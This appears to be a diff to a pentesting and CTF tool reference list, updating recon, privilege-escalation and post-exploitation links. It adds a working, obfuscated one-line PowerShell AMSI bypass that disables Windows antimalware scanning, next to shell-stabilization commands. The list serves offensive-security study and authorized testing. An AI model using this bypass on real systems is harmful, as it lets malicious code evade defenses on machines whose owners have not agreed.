@@ -1,9 +1,8 @@
 # Tools Of The Trade
-A collection of tools for CTFs or engagements
+A collection of tools for CTFs, Forensics, or Engagements.
 
 ### Recon
 ```
-https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
 https://github.com/EnableSecurity/wafw00f
 ```
 ```
@@ -30,6 +29,7 @@ https://github.com/ropnop/windapsearch
 https://github.com/byt3bl33d3r/pth-toolkit
 https://github.com/rvazarkar/GMSAPasswordReader
 https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
 ```
 
 ### Exploitation
@@ -69,6 +69,9 @@ export SHELL=/bin/bash;
 export TERM=screen; 
 stty rows 38 columns 116; 
 reset;
+
+# AMSI Bypass
+[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
 ```
 
 ### Tunneling
@@ -89,4 +92,5 @@ https://10minutemail.com/
 https://lolbas-project.github.io/
 https://github.com/FortyNorthSecurity/EyeWitness
 https://www.pingcastle.com/
+https://github.com/rasta-mouse/ThreatCheck
 ```
